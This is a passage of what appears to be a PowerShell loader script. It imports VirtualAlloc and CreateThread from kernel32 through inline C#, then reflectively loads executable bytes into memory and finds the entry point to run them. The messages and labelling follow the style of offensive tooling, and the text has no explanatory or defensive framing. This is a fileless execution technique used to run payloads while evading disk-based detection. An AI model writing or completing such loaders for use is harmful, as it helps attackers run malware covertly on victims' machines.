    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@ -Name "Win32Memory" -Namespace "Win32Api" -PassThru

    # 1. Load the C# EXE bytes into the current PowerShell process memory
    Write-Host "[*] Loading Component Host into memory..." -ForegroundColor Cyan
    $Assembly = [System.Reflection.Assembly]::Load($exeBytes)

    # 2. Identify the entry point (the Main method in your C# code)
    $EntryPoint = $Assembly.EntryPoint

    # 3. Invoke the C# Main method
